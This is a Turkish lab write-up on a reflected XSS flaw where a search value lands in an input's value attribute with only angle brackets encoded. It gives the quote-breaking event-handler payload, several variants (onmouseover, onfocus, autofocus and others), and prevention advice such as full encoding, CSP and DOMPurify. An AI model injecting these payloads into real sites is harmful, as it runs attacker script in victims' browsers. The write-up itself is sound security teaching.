# Reflected XSS into attribute with angle brackets HTML-encoded

## Lab Açıklaması
Bu laboratuvarda, HTML input attribute'inde meydana gelen Reflected XSS zafiyetini inceliyoruz. Açı parantezler (`<`, `>`) HTML-encoded olmasına rağmen, attribute'ten kaçış yaparak XSS saldırısı gerçekleştirebiliriz.

---

## Analiz

### Uygulama Davranışı
- Sitede bir arama (search) fonksiyonu bulunmaktadır.
- Kullanıcının arama terimi `value` attribute'inde yansıtılır.

### Kaynak Kod İncelemesi
```html
<input type=text placeholder='Search the blog...' name=search value="TESTEST">
<button type=submit class=button>Search</button>
```

### Zafiyet Noktası
- Kullanıcı girdisi doğrudan HTML input elementi'nin `value` attribute'ine yazılıyor.
- Açı parantezler HTML-encoded olsa da (`&lt;`, `&gt;`), **attribute'ten kaçmak mümkündür**.
- Attribute'den çıktıktan sonra yeni event handler'lar enjekte edilebilir.

#### Kodun Yapısı
```
value=" [USER INPUT HERE] "
```

Bu yapıda:
1. Double quote (`"`) ile attribute kapatıyoruz.
2. Yeni bir event handler ekliyoruz.
3. Son double quote'u kapatıyoruz.

---

## İstismar

### Saldırı Stratejisi
1. `value` attribute'inin çift tırnak (`"`) ile kapatılması sağlanır.
2. Yeni bir event handler (örn: `onmouseover`) eklenir.
3. Event tetiklendiğinde JavaScript çalıştırılır.

### Payload

```
" onmouseover="alert(1)" a="
```

#### Payload Açıklaması
- İlk `"` → `value` attribute'ini kapatır
- `onmouseover="alert(1)"` → Yeni bir event handler eklenir
- `a="` → Kalan tırnak işaretlerini dengeler

#### Sonuç HTML
```html
<input type=text placeholder='Search the blog...' name=search value="" onmouseover="alert(1)" a="">
```

### Saldırı Adımları
1. Arama kutusuna payload'ı yaz: `" onmouseover="alert(1)"`
2. Search butonuna tıkla.
3. Sonraki sayfada input alanının üzerine geldiğinde (mouseover olayı).
4. JavaScript çalıştırılır ve **pop-up** görüntülenir.

---

## Sonuç

✅ **Lab Başarıyla Tamamlandı**

Payload başarıyla çalışır ve **alert popup** görüntülenir. Bu, HTML attribute'in doğru şekilde kapatılarak event handler enjeksiyonunun mümkün olduğunu gösterir.

---

## Zafiyet Özeti

| Unsur | Değer |
|-------|-------|
| **Zafiyet Türü** | Reflected XSS (Attribute-based) |
| **Kaynak (Source)** | URL query parameter (`search`) |
| **Sink** | HTML `value` attribute |
| **Escape Yöntemi** | Double quote (`"`) ile attribute kapatmak |
| **Event Handler** | `onmouseover` |
| **Payload** | `" onmouseover="alert(1)" a="` |
| **Tetikleme Yolu** | Input alanının üzerine fare götürmek |

---

## Benzer Event Handlers

Aynı zafiyet diğer event handler'larla da tetiklenebilir:

```html
" onmouseover="alert(1)" a="        <!-- Fare üzerine gelince -->
" onload="alert(1)" a="            <!-- Sayfa yüklenince -->
" onfocus="alert(1)" a="           <!-- Focus alınca -->
" onclick="alert(1)" a="           <!-- Tıklanınca -->
" onchange="alert(1)" a="          <!-- Değeri değişince -->
" autofocus onfocus="alert(1)" a=" <!-- Otomatik focus + event -->
```

---

## Önleme Önerileri

### 1. Çıkış Karakterlerini HTML-Encode Etme (Mevcut Yeterli DEĞİL)
```html
<!-- ❌ Yeterli değil - sadece açı parantezleri encode ediyor -->
<input value="&lt;script&gt;...&lt;/script&gt;">
```

### 2. Tüm Özel Karakterleri Encode Etme
```html
<!-- ✅ Tırnak işaretlerini de encode etmeli -->
<input value="&quot;onmouseover=&quot;alert(1)&quot;&quot;">
```

```javascript
// Node.js / JavaScript örneği
function htmlEncode(str) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
    };
    return str.replace(/[&<>"']/g, char => map[char]);
}
```

### 3. Input Validasyonu
```javascript
// Arama input'unu sadece alfanumerik karakterlere sınırla
function validateSearch(input) {
    return /^[a-zA-Z0-9\s]*$/.test(input);
}
```

### 4. Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### 5. Güvenli Attribute Yazma
```javascript
// innerHTML yerine textContent veya setAttribute kullan
const input = document.createElement('input');
input.setAttribute('value', userInput); // Otomatik olarak encode eder
```

### 6. DOMPurify Kullanma
```javascript
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(userInput);
```

---

## Genel Güvenlik Önerileri

1. **Context Farkında Olun**: Attribute, HTML body, JavaScript context'inde encoding farklıdır.
2. **Whitelist Kullan**: Sadece güvenli karakterlere izin ver.
3. **Tüm Özel Karakterleri Encode Et**: Sadece `<>` değil, `"'&` de dahil.
4. **Server-Side Validation**: Validation sadece client-side'da değil, server-side'da da yapılmalı.
5. **Content Security Policy**: CSP header'ları ekle.
6. **Güvenli Kütüphane Kullan**: DOMPurify, sanitize-html gibi kütüphaneler kullan.
